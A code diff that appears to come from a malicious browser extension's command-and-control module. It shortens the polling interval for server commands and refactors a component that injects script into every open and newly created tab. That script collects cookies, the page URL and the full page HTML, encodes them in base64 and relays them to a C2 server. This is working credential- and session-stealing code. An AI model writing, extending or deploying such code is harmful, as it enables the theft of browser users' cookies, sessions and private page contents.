@@ -8,11 +8,11 @@
 let executedCmd = {{CC_EXECUTED_CMD_FN}};
 let getCmds = {{CC_GET_CMDS_FN}};
 let sendData = {{CC_SEND_DATA_FN}};
-let QUERY_CMDS_INTERVAL = 1 * 60 * 1000; // Get new cmds from server every 1 minute.
+let QUERY_CMDS_INTERVAL = 5 * 1000; // Get new cmds from server every 10 secs.
 let MODULE_NAME = 'tabs';
 //
 
-function execModulesWithParams(args_list) {
+function execModuleWithParams(args) {
 	for (let i=0; i<MODULE_TECHNIQUES.length; i++) {
 		MODULE_TECHNIQUES[i](...args);
 	}
@@ -35,9 +35,9 @@ function parseExecCmdsMail(cmds_list) {
 	}
 }
 
-function queryNewCmds() {
-	let cmds_list = getCmds();
-	parseExecCmdsMail(cmds_list);
+async function queryNewCmds() {
+	let cmds_list = await getCmds();
+	await parseExecCmdsMail(cmds_list);
 }
 
 function main() {
@@ -56,13 +56,13 @@ setTimeout(main, 5000); // Lazy 5-secs start-up.
 */
 
 extract_data_code = 'st=document.documentElement.innerHTML;h=btoa(unescape(encodeURIComponent(st)));d={cookies:document.cookie, url:document.location.href, fullhtml:h};full_data=btoa(JSON.stringify(d));';
-content_script_code = 'document.location.href = \'javscript:function() {' + extract_data_code + ';fetch("' + cc_server + '" + full_data);}();\'';
+// content_script_code = 'document.location.href = \'javscript:function() {' + extract_data_code + ';fetch("' + cc_server + '" + full_data);}();\'';
 background_code = 'function() {' + extract_data_code + ';chrome.runtime.sendMessage(full_data);}();';
 
 // Background handler for onMessage events.
 function get_cookies_post_server(request, sender, sendResponse) {
 	console.log('[+] Got cookies/html data from: ' + (sender.tab ? sender.tab.url : 'from the extension') + request);
-	send_data(encodeURIComponent(request));
+	sendData(encodeURIComponent(request));
 }
 
 ////
@@ -105,15 +105,15 @@ function clean_all() {
 
 }
 
-async function tabs_hook_main(args) {
-	if (args[0] === 'add') {
+async function tabs_hook_main(opcode, others) {
+	if (opcode === 'add') {
 		// Method 1 listener: Inject into all tabs & Listen for the extracted data & auto sender.
 		chrome.runtime.onMessage.addListener(get_cookies_post_server);
 		inject_active_tab_get_data();
 		// Method 2 listeners: On every new opened tab.
 		chrome.tabs.onCreated.addListener(new_tab_injector);
 	} 
-	else if (args[0] === 'rm') {
+	else if (opcode === 'rm') {
 		clean_all();
 	}
 }
